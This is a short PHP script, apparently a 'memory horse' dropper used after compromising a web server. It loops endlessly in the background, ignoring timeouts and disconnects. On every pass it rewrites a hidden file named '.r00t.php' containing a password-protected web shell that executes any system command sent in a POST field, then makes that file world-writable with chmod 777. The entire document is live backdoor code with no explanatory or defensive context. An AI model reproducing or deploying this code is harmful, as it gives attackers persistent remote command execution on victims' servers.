<?php
ignore_user_abort(true);
set_time_limit(0);
while (1){
$path = '.r00t.php';
$data = '<?php if(sha1($_POST["check"]) === "1d26c61b6ee02113b82b27f3a1026d1778000daa"){@system($_POST["tinmin"]);}?>';
@file_put_contents($path, $data);
system('chmod 777 '.$path);
usleep(100);
}
?>